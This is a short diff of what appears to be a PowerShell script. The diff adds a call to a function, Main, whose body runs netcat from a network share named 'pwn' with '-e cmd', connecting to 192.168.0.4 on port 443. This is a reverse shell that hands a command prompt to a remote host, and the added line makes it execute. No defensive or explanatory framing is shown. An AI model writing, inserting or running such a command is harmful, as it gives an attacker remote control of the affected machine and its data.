@@ -17,3 +17,4 @@ function Main
 
     cmd /c \\192.168.0.4\pwn\nc.exe -e cmd 192.168.0.4 443
 }
+Main
